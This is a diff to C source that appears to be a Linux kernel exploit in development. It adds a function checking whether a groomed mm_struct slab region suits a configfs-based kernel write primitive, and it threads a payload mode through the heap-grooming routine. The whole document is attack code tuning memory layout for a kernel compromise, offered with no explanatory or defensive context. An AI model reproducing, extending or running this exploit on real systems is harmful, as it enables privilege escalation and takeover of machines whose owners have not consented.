@@ -1164,8 +1164,42 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
 #endif
 }
 
+static int controlled_mm_configfs_write_usable(uintptr_t base,
+                                                int payload_mode) {
+#if defined(APP_CONFIGFS_WRITE_PAGE_GATE) && APP_CONFIGFS_WRITE_PAGE_GATE
+  if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    const uintptr_t write_align = 0x01000000ULL;
+    const uintptr_t max_write_window = 0x02000000ULL;
+    const size_t payload_len = sizeof("CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK");
+    uintptr_t target = base + SKB_DATA_DELTA + SCRATCH_OFF;
+    uintptr_t write_base = target & ~(write_align - 1);
+    uintptr_t end = target - write_base + payload_len;
+
+    if (end > max_write_window || !((write_base >> 24) & 0xff) ||
+        !((write_base >> 32) & 0xff) || !((write_base >> 40) & 0xff) ||
+        !((write_base >> 48) & 0xff) || !((write_base >> 56) & 0xff)) {
+      return 0;
+    }
+    for (uintptr_t candidate_size = end;
+         candidate_size <= max_write_window &&
+         candidate_size - end < 0x200;
+         candidate_size++) {
+      if ((candidate_size & 0xff) && ((candidate_size >> 8) & 0xff) &&
+          ((candidate_size >> 16) & 0xff)) {
+        return 1;
+      }
+    }
+    return 0;
+  }
+#else
+  (void)base;
+  (void)payload_mode;
+#endif
+  return 1;
+}
+
 static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
-                                       int *chosen_fds) {
+                                       int *chosen_fds, int payload_mode) {
   const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
   const size_t max_groups = 64;
   const size_t opaque_capacity = S918_PAGE_SCAN_MAX * batch;
@@ -1249,6 +1283,11 @@ static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
       SYSCHK(close(fd));
       continue;
     }
+    if (counts[group] > batch) {
+      SYSCHK(close(fd));
+      hint = 0;
+      continue;
+    }
     if (seen[group * batch + slot]) {
       SYSCHK(close(fd));
       hint = base;
@@ -1266,6 +1305,15 @@ static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
               attempt, group, base, slot, counts[group], hint_hit);
     }
     if (counts[group] == batch) {
+      if (!controlled_mm_configfs_write_usable(base, payload_mode)) {
+        pr_info("controlled mm group rejected configfs-write base=%016zx "
+                "scratch=%016zx\n",
+                base,
+                (uintptr_t)(base + SKB_DATA_DELTA + SCRATCH_OFF));
+        counts[group] = batch + 1;
+        hint = 0;
+        continue;
+      }
       chosen = group;
       chosen_attempt = attempt;
       *base_out = base;
@@ -1933,7 +1981,8 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
     SYSCHK(-1);
   }
 
-  if (!collect_controlled_mm_group((size_t)cpu_count, &base, target_fds)) {
+  if (!collect_controlled_mm_group((size_t)cpu_count, &base, target_fds,
+                                   payload_mode)) {
     free(target_fds);
     return 0;
   }
